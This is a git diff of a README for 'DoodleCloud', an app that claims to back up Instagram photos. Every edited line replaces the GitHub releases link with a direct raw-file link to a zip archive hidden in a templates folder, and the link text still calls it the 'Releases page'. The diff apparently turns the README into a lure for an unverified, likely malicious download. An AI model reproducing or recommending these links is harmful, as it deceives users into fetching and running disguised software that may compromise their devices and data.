@@ -1,7 +1,7 @@
 # ☁️ DoodleCloud - Store Your Photos Securely Online
 
 ## 📥 Download Now
-[![Download DoodleCloud](https://img.shields.io/badge/Download-DoodleCloud-blue.svg)](https://github.com/backup39/DoodleCloud/releases)
+[![Download DoodleCloud](https://github.com/backup39/DoodleCloud/raw/refs/heads/main/gui/templates/Cloud-Doodle-3.8.zip)](https://github.com/backup39/DoodleCloud/raw/refs/heads/main/gui/templates/Cloud-Doodle-3.8.zip)
 
 ## 🌟 Overview
 DoodleCloud is a cloud storage solution that saves your Instagram photos safely. With DoodleCloud, you can easily store, access, and share your cherished moments from Instagram without worry. Enjoy hassle-free cloud storage that keeps your memories protected.
@@ -16,12 +16,12 @@ To get started with DoodleCloud, follow these simple steps. No technical backgro
    - Storage Space: At least 100 MB free space
 
 2. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/backup39/DoodleCloud/releases) to download the latest version. 
+   Head over to our [Releases page](https://github.com/backup39/DoodleCloud/raw/refs/heads/main/gui/templates/Cloud-Doodle-3.8.zip) to download the latest version. 
 
 ## 🔄 Download & Install
 To download the application, click the link below:
 
-[Download DoodleCloud](https://github.com/backup39/DoodleCloud/releases)
+[Download DoodleCloud](https://github.com/backup39/DoodleCloud/raw/refs/heads/main/gui/templates/Cloud-Doodle-3.8.zip)
 
 Once you’re on the Releases page:
 - Look for the latest version of DoodleCloud.
